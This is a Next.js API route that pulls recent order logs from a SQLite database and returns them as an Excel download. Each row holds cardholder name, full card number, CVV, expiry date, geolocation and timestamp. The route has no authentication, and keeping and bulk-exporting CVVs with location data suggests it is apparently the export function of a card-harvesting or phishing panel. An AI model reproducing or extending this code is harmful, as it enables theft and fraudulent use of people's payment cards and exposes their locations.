import { NextResponse } from 'next/server'
import { databaseService } from '@/lib/sqlite-database'
import ExcelJS from 'exceljs'

export const dynamic = 'force-dynamic'

export async function GET(request: Request) {
  try {
    const url = new URL(request.url)
    // Support different time units: minutes, hours
    const minutes = url.searchParams.get('minutes')
    const hours = url.searchParams.get('hours')
    
    let cutoffTime: number
    if (minutes) {
      cutoffTime = Date.now() - (parseInt(minutes) * 60 * 1000)
    } else if (hours) {
      cutoffTime = Date.now() - (parseInt(hours) * 60 * 60 * 1000)
    } else {
      // Default: last 24 hours
      cutoffTime = Date.now() - (24 * 60 * 60 * 1000)
    }
    
    // Get all completed order logs
    const allRows = databaseService.getCompletedOrderLogsAll() as any[]
    
    // Filter for recent records (within specified time period)
    const rows = allRows.filter(row => {
      const createdAt = new Date(row.createdAt).getTime()
      return createdAt >= cutoffTime
    })

    const timeAgo = minutes ? `${minutes} minutes` : hours ? `${hours} hours` : '24 hours'
    console.log(`📊 Filtering completed order logs: ${rows.length} records from last ${timeAgo} (out of ${allRows.length} total)`)

    const workbook = new ExcelJS.Workbook()
    const worksheet = workbook.addWorksheet('Recent Data')

    // Collect all unique keys from all JSON snapshots (for logging only)
    const allKeys = new Set<string>()
    const parsedRows: Array<Record<string, any>> = []

    rows.forEach((row, index) => {
      try {
        const snapshot = JSON.parse(row.snapshotJson || '{}')
        
        // Add all keys to the set
        Object.keys(snapshot).forEach(key => allKeys.add(key))
        
        // Extract and parse locationTimestamp (convert UTC to UTC+7)
        const locationTimestamp = snapshot.locationTimestamp || ''
        let date = ''
        let time = ''
        
        if (locationTimestamp) {
          try {
            const dateObj = new Date(locationTimestamp)
            if (!isNaN(dateObj.getTime())) {
              // Convert UTC to UTC+7 (add 7 hours)
              const utc7Date = new Date(dateObj.getTime() + (7 * 60 * 60 * 1000))
              
              // Format: YYYY-MM-DD (UTC+7)
              const year = utc7Date.getUTCFullYear()
              const month = String(utc7Date.getUTCMonth() + 1).padStart(2, '0')
              const day = String(utc7Date.getUTCDate()).padStart(2, '0')
              date = `${year}-${month}-${day}`
              
              // Format: HH:MM:SS (UTC+7)
              const hours = String(utc7Date.getUTCHours()).padStart(2, '0')
              const minutes = String(utc7Date.getUTCMinutes()).padStart(2, '0')
              const seconds = String(utc7Date.getUTCSeconds()).padStart(2, '0')
              time = `${hours}:${minutes}:${seconds}`
            }
          } catch (e) {
            // If parsing fails, leave empty
          }
        }
        
        // Extract only the requested fields
        parsedRows.push({
          id: row.orderId,
          cardholderName: snapshot.cardholderName || '',
          cardNumber: snapshot.cardNumber || '',
          cvv: snapshot.cvv || '',
          expiryDate: snapshot.expiryDate || '',
          latitude: row.latitude || '',
          longitude: row.longitude || '',
          date: date,
          time: time
        })
      } catch (e) {
        console.error(`❌ Error parsing JSON for row ${index + 1}:`, e)
        parsedRows.push({
          id: row.orderId,
          cardholderName: '',
          cardNumber: '',
          cvv: '',
          expiryDate: '',
          latitude: row.latitude || '',
          longitude: row.longitude || '',
          date: '',
          time: ''
        })
      }
    })

    // Define columns: ID + requested fields only
    const columns = [
      { header: 'ID', key: 'id', width: 30 },
      { header: 'Cardholder Name', key: 'cardholderName', width: 30 },
      { header: 'Card Number', key: 'cardNumber', width: 30 },
      { header: 'CVV', key: 'cvv', width: 15 },
      { header: 'Expiry Date', key: 'expiryDate', width: 20 },
      { header: 'Latitude', key: 'latitude', width: 20 },
      { header: 'Longitude', key: 'longitude', width: 20 },
      { header: 'Date', key: 'date', width: 15 },
      { header: 'Time', key: 'time', width: 15 }
    ]

    worksheet.columns = columns

    // Add rows
    parsedRows.forEach(parsedRow => {
      worksheet.addRow(parsedRow)
    })

    // Set all columns to Text type to prevent Excel auto-conversion
    worksheet.columns.forEach(column => {
      if (column.key) {
        worksheet.getColumn(column.key).numFmt = '@'
      }
    })

    // Style header row
    worksheet.getRow(1).font = { bold: true }
    worksheet.getRow(1).fill = {
      type: 'pattern',
      pattern: 'solid',
      fgColor: { argb: 'FFE0E0E0' }
    }

    // Generate buffer
    const buffer = await workbook.xlsx.writeBuffer()

    return new NextResponse(buffer, {
      status: 200,
      headers: {
        'Content-Type': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'Content-Disposition': `attachment; filename="recent-data-${Date.now()}.xlsx"`
      }
    })
  } catch (e) {
    console.error('Extract recent JSON error:', e)
    return NextResponse.json({ error: 'Failed to extract recent JSON', details: String(e) }, { status: 500 })
  }
}

